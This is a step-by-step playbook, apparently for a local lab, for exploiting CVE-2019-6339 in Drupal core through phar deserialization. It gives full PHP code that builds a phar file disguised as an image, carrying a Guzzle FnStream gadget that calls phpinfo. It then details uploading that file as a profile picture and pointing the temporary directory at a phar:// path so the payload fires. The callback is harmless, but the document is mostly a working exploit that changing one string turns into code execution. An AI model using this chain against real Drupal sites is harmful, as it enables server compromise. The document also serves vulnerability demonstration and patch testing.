### Playbook for demonstrating exploit CVE-2019-6339 for drupal

**Versions applicable - Drupal Core versions 7.x prior to 7.62, 8.6.x prior to 8.6.6 and 8.5.x prior to 8.5.9**
**Requirements - Admin access to drupal site**

1. Create a directory in your home directory.

2. Move into the directory.

3. Create a php file and copy the following code into it

        <?php

        namespace GuzzleHttp\Psr7 {
            class FnStream {

                public $_fn_close = "phpinfo";

                public function __destruct() {
                    if (isset($this->_fn_close)) {
                        call_user_func($this->_fn_close);
                    }
                }
            }
        }

        namespace {
            @unlink("phar.phar");
            $phar = new Phar("phar.phar");
            $phar->startBuffering();
            $phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");
            $o = new \GuzzleHttp\Psr7\FnStream();
            $phar->setMetadata($o);
            $phar->addFromString("test.txt", "test");
            $phar->stopBuffering();

        }
        ?>

4. Save the file.

5. Run the file using the below command.
   
   `php <file_name>.php`

6. A `phar.phar` file will be created in your current folder.

7. Rename the file using the below command.

    ` mv phar.phar exploit.png`

8. Open the drupal site using `localhost/drupal-8.6.5`

9. Go to the admin profile and click `Edit profile`.

10. Upload the `exploit.png` file into the picture option.

11. After uploading, click on the link `exploit.png` and copy the path `sites/default/..../exploit.png`

12. Save

13. Go to `Manage` and click on `configuration`.

14. Select `File system` under `Media`

15. Edit the `Temporary directory` path by pasting the above copied url in the following format
    
    `phar://sites/default/..../exploit.png`

16. Reload the site.